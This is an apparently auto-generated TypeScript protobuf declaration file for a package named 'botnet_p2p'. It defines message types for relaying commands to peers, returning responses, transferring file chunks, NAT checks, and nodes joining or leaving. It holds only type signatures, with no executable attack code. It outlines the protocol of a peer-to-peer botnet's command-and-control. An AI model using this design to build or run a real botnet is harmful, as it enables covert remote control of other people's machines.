// package: botnet_p2p
// file: Message.proto

import * as jspb from "google-protobuf";

export class Message extends jspb.Message {
  getUuid(): string;
  setUuid(value: string): void;

  getType(): Message.MessageType;
  setType(value: Message.MessageType): void;

  getSender(): string;
  setSender(value: string): void;

  getReceiver(): string;
  setReceiver(value: string): void;

  getPropagation(): boolean;
  setPropagation(value: boolean): void;

  getSignature(): Uint8Array | string;
  getSignature_asU8(): Uint8Array;
  getSignature_asB64(): string;
  setSignature(value: Uint8Array | string): void;

  hasCommand(): boolean;
  clearCommand(): void;
  getCommand(): Message.Command | undefined;
  setCommand(value?: Message.Command): void;

  hasResponse(): boolean;
  clearResponse(): void;
  getResponse(): Message.Response | undefined;
  setResponse(value?: Message.Response): void;

  hasFile(): boolean;
  clearFile(): void;
  getFile(): Message.FileChunk | undefined;
  setFile(value?: Message.FileChunk): void;

  hasNatrequest(): boolean;
  clearNatrequest(): void;
  getNatrequest(): Message.NATRequest | undefined;
  setNatrequest(value?: Message.NATRequest): void;

  hasNatcheck(): boolean;
  clearNatcheck(): void;
  getNatcheck(): Message.NATCheck | undefined;
  setNatcheck(value?: Message.NATCheck): void;

  hasJoin(): boolean;
  clearJoin(): void;
  getJoin(): Message.Join | undefined;
  setJoin(value?: Message.Join): void;

  hasLeave(): boolean;
  clearLeave(): void;
  getLeave(): Message.Leave | undefined;
  setLeave(value?: Message.Leave): void;

  getPayloadCase(): Message.PayloadCase;
  serializeBinary(): Uint8Array;
  toObject(includeInstance?: boolean): Message.AsObject;
  static toObject(includeInstance: boolean, msg: Message): Message.AsObject;
  static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
  static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
  static serializeBinaryToWriter(message: Message, writer: jspb.BinaryWriter): void;
  static deserializeBinary(bytes: Uint8Array): Message;
  static deserializeBinaryFromReader(message: Message, reader: jspb.BinaryReader): Message;
}

export namespace Message {
  export type AsObject = {
    uuid: string,
    type: Message.MessageType,
    sender: string,
    receiver: string,
    propagation: boolean,
    signature: Uint8Array | string,
    command?: Message.Command.AsObject,
    response?: Message.Response.AsObject,
    file?: Message.FileChunk.AsObject,
    natrequest?: Message.NATRequest.AsObject,
    natcheck?: Message.NATCheck.AsObject,
    join?: Message.Join.AsObject,
    leave?: Message.Leave.AsObject,
  }

  export class Command extends jspb.Message {
    getCommand(): string;
    setCommand(value: string): void;

    getSendresponse(): boolean;
    setSendresponse(value: boolean): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): Command.AsObject;
    static toObject(includeInstance: boolean, msg: Command): Command.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: Command, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): Command;
    static deserializeBinaryFromReader(message: Command, reader: jspb.BinaryReader): Command;
  }

  export namespace Command {
    export type AsObject = {
      command: string,
      sendresponse: boolean,
    }
  }

  export class Response extends jspb.Message {
    getValue(): string;
    setValue(value: string): void;

    getStatus(): Message.Status;
    setStatus(value: Message.Status): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): Response.AsObject;
    static toObject(includeInstance: boolean, msg: Response): Response.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: Response, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): Response;
    static deserializeBinaryFromReader(message: Response, reader: jspb.BinaryReader): Response;
  }

  export namespace Response {
    export type AsObject = {
      value: string,
      status: Message.Status,
    }
  }

  export class FileChunk extends jspb.Message {
    getPath(): string;
    setPath(value: string): void;

    getName(): boolean;
    setName(value: boolean): void;

    getChunknumber(): number;
    setChunknumber(value: number): void;

    getAllchunks(): number;
    setAllchunks(value: number): void;

    getChunksize(): number;
    setChunksize(value: number): void;

    getData(): Uint8Array | string;
    getData_asU8(): Uint8Array;
    getData_asB64(): string;
    setData(value: Uint8Array | string): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): FileChunk.AsObject;
    static toObject(includeInstance: boolean, msg: FileChunk): FileChunk.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: FileChunk, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): FileChunk;
    static deserializeBinaryFromReader(message: FileChunk, reader: jspb.BinaryReader): FileChunk;
  }

  export namespace FileChunk {
    export type AsObject = {
      path: string,
      name: boolean,
      chunknumber: number,
      allchunks: number,
      chunksize: number,
      data: Uint8Array | string,
    }
  }

  export class NATRequest extends jspb.Message {
    getTarget(): string;
    setTarget(value: string): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): NATRequest.AsObject;
    static toObject(includeInstance: boolean, msg: NATRequest): NATRequest.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: NATRequest, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): NATRequest;
    static deserializeBinaryFromReader(message: NATRequest, reader: jspb.BinaryReader): NATRequest;
  }

  export namespace NATRequest {
    export type AsObject = {
      target: string,
    }
  }

  export class NATCheck extends jspb.Message {
    getSource(): string;
    setSource(value: string): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): NATCheck.AsObject;
    static toObject(includeInstance: boolean, msg: NATCheck): NATCheck.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: NATCheck, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): NATCheck;
    static deserializeBinaryFromReader(message: NATCheck, reader: jspb.BinaryReader): NATCheck;
  }

  export namespace NATCheck {
    export type AsObject = {
      source: string,
    }
  }

  export class Join extends jspb.Message {
    getIp(): string;
    setIp(value: string): void;

    getPort(): string;
    setPort(value: string): void;

    getIsnat(): boolean;
    setIsnat(value: boolean): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): Join.AsObject;
    static toObject(includeInstance: boolean, msg: Join): Join.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: Join, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): Join;
    static deserializeBinaryFromReader(message: Join, reader: jspb.BinaryReader): Join;
  }

  export namespace Join {
    export type AsObject = {
      ip: string,
      port: string,
      isnat: boolean,
    }
  }

  export class Leave extends jspb.Message {
    getGuid(): string;
    setGuid(value: string): void;

    serializeBinary(): Uint8Array;
    toObject(includeInstance?: boolean): Leave.AsObject;
    static toObject(includeInstance: boolean, msg: Leave): Leave.AsObject;
    static extensions: {[key: number]: jspb.ExtensionFieldInfo<jspb.Message>};
    static extensionsBinary: {[key: number]: jspb.ExtensionFieldBinaryInfo<jspb.Message>};
    static serializeBinaryToWriter(message: Leave, writer: jspb.BinaryWriter): void;
    static deserializeBinary(bytes: Uint8Array): Leave;
    static deserializeBinaryFromReader(message: Leave, reader: jspb.BinaryReader): Leave;
  }

  export namespace Leave {
    export type AsObject = {
      guid: string,
    }
  }

  export enum MessageType {
    UNDEFINED = 0,
    COMMAND = 1,
    RESPONSE = 2,
    FILE_CHUNK = 3,
    NAT_REQUEST = 4,
    NAT_CHECK = 5,
    PING = 6,
    JOIN = 7,
    LEAVE = 8,
  }

  export enum Status {
    FAIL = 0,
    OK = 1,
  }

  export enum PayloadCase {
    PAYLOAD_NOT_SET = 0,
    COMMAND = 7,
    RESPONSE = 8,
    FILE = 9,
    NATREQUEST = 10,
    NATCHECK = 11,
    JOIN = 12,
    LEAVE = 13,
  }
}

